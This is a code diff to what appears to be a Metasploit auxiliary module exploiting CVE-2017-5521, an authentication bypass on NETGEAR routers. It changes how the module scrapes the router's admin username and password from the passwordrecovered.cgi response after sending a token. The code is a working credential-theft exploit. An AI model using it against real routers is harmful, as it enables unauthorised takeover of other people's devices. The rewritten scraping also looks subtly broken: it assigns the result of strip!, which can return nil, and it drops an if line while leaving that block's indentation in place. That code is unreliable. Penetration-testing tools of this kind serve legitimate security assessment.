@@ -32,7 +32,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911' ],
           [ 'URL', 'http://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],
           [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/'],
-          [ 'URL' , 'http://pastebin.com/dB4bTgxz'],
+          [ 'URL', 'http://pastebin.com/dB4bTgxz'],
           [ 'EDB', '41205']
         ],
       'License'        => MSF_LICENSE
@@ -83,9 +83,15 @@ class MetasploitModule < Msf::Auxiliary
         })
 
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
-      if r.to_s.include?('left">')
-        username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
-        password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td><td class=\"MNUText\" align=\"left\">", "</td>")
+      
+      html = r.get_html_document
+      raw_html = html.text
+
+      username = scrape(raw_html, "Router Admin Username", "Router Admin Password")
+      password = scrape(raw_html, "Router Admin Password", "You can")
+      username = username.strip!
+      password = password.strip!
+ 
         if username == "" || password == ""
           print_error("No Creds found")
         else
